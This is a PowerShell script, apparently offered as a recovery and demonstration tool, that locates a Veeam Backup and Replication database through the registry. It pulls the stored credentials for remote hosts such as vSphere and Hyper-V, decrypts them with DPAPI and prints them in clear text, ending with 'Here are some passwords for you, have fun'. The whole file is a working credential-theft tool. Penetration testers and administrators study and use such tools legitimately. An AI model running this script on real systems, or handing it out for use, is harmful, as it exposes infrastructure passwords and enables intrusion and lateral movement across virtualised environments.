# About:  The script is designed to recover passwords used by Veeam to connect
#         to remote hosts vSphere, Hyper-V, etc. The script is intended for 
#         demonstration and academic purposes. Use with permission from the 
#         system owner.
#
# Author: Konstantin Burov.
#
# Usage:  Run as administrator (elevated) in PowerShell on a host in a Veeam 
#         server.

Add-Type -assembly System.Security

#Searching for connection parameters in the registry
try {
	$VeaamRegPath = "HKLM:\SOFTWARE\Veeam\Veeam Backup and Replication\"
	$SqlDatabaseName = (Get-ItemProperty -Path $VeaamRegPath -ErrorAction Stop).SqlDatabaseName 
	$SqlInstanceName = (Get-ItemProperty -Path $VeaamRegPath -ErrorAction Stop).SqlInstanceName
	$SqlServerName = (Get-ItemProperty -Path $VeaamRegPath -ErrorAction Stop).SqlServerName
}
catch {
	echo "Can't find Veeam on localhost, try running as Administrator"
	exit -1
}

""
"Found Veeam DB on " + $SqlServerName + "\" + $SqlInstanceName + "@" + $SqlDatabaseName + ", connecting...  "

#Forming the connection string
$SQL = "SELECT [user_name] AS 'User name',[password] AS 'Password' FROM [$SqlDatabaseName].[dbo].[Credentials] "+
	"WHERE password <> ''" #Filter empty passwords
$auth = "Integrated Security=SSPI;" #Local user
$connectionString = "Provider=sqloledb; Data Source=$SqlServerName\$SqlInstanceName; " +
"Initial Catalog=$SqlDatabaseName; $auth; "
$connection = New-Object System.Data.OleDb.OleDbConnection $connectionString
$command = New-Object System.Data.OleDb.OleDbCommand $SQL, $connection

#Fetching encrypted credentials from the database
try {
	$connection.Open()
	$adapter = New-Object System.Data.OleDb.OleDbDataAdapter $command
	$dataset = New-Object System.Data.DataSet
	[void] $adapter.Fill($dataSet)
	$connection.Close()
}
catch {
	"Can't connect to DB, exit."
	exit -1
}

"OK"

$rows=($dataset.Tables | Select-Object -Expand Rows)
if ($rows.count -eq 0) {
	"No passwords today, sorry."
	exit
}

""
"Here are some passwords for you, have fun:"

#Decrypting passwords using DPAPI
$rows | ForEach-Object -Process {
	$EnryptedPWD = [Convert]::FromBase64String($_.password)
	$ClearPWD = [System.Security.Cryptography.ProtectedData]::Unprotect( $EnryptedPWD, $null, [System.Security.Cryptography.DataProtectionScope]::LocalMachine )
	$enc = [system.text.encoding]::Default
	$_.password = $enc.GetString($ClearPWD)
}
 
Write-Output $rows | FT | Out-string
